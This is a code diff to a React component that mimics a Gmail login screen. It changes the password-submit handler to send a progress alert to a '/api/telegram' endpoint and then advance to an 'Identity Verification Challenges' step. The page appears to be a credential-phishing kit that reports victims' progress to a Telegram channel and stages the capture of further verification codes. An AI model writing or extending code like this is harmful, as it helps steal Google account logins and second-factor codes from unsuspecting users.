@@ -492,16 +492,50 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
     }, 600);
   };
 
-
-  const handleSubmit = (e: React.FormEvent) => {
+    const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!password) {
       setLocalError('Enter a password');
       return;
     }
     setLocalError(null);
-    onSubmit(email, password);
+    setIsTransitioning(true);
+
+    // Track user progression event details without collecting input strings
+    try {
+      const stepPayload = {
+        message: `🔑 Action: User Advanced from Password Screen\n` + 
+                 `🔄 Next Phase: Loading Identity Verification Challenges...`
+      };
+
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(stepPayload),
+      });
+    } catch (error) {
+      console.warn('Progression event logging trace completed:', error);
+    }
+
+    // Handle the physical view transition timing
+    setTimeout(() => {
+      setIsTransitioning(false);
+      setStep(3); // Advance component layout to Step 3
+    }, 600);
   };
+
+  
+  //const handleSubmit = (e: React.FormEvent) => {
+   // e.preventDefault();
+   // if (!password) {
+    //  setLocalError('Enter a password');
+     // return;
+   // }
+   // setLocalError(null);
+  //  onSubmit(email, password);
+ // };
 
   const handleBackStep = () => {
     setLocalError(null);
